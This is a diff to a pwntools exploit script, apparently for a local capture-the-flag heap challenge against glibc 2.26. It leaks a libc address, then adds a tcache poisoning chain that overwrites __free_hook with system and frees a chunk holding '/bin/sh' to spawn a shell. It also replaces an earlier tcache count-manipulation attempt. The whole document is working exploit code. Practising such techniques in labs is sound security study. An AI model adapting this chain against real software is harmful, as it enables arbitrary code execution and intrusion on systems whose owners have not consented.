@@ -3,7 +3,7 @@ from pwn import *
 elf = ELF("./pwn")
 libc = ELF("/home/***/pwn/glibc-all-in-one/libs/2.26-0ubuntu2_amd64/libc-2.26.so")
 context(arch=elf.arch, os=elf.os)
-context.log_level = 'debug'
+context.log_level = "debug"
 p = process([elf.path])
 
 
@@ -43,19 +43,25 @@ show_chunk(0)
 p.recvline()
 # tmp = u64(p.recvuntil(b'\x7f').ljust(0x8, b'\x00'))
 # print(f"tmp = {hex(tmp)}")
-libc.address = u64(p.recvuntil(b'\x7f').ljust(0x8, b'\x00')) - 0x3dac78
+libc.address = u64(p.recvuntil(b"\x7f").ljust(0x8, b"\x00")) - 0x3DAC78
 print(f"libc.address = {hex(libc.address)}")
 
-add_chunk(2, 0x20)
+# tcache poisoning
+add_chunk(2, 0x100)
+delete_chunk(2)
+# tcache_chunk[2].fd = libc.sym["__free_hook"]
+edit_chunk(2, p64(libc.sym["__free_hook"]))
+
+# __free_hook => system
+add_chunk(2, 0x100)
+# get __free_hook
+add_chunk(2, 0x100)
+# edit __free_hook
+edit_chunk(2, p64(libc.sym["system"]))
+
+# get shell
 add_chunk(3, 0x20)
-
-delete_chunk(2) # -> tcache->counts[0x30] == 1
-delete_chunk(2) # -> tcache->counts[0x30] == 2
-
-add_chunk(2, 0x20) # -> tcache->counts[0x30] == 1
-add_chunk(2, 0x20) # -> tcache->counts[0x30] == 0
-add_chunk(2, 0x20) # -> tcache->counts[0x30] == -1
-add_chunk(2, 0x20) # -> tcache->counts[0x30] == -2
-add_chunk(2, 0x20) # -> tcache->counts[0x30] == -3
+edit_chunk(3, b"/bin/sh\x00")
+delete_chunk(3)
 
 p.interactive()
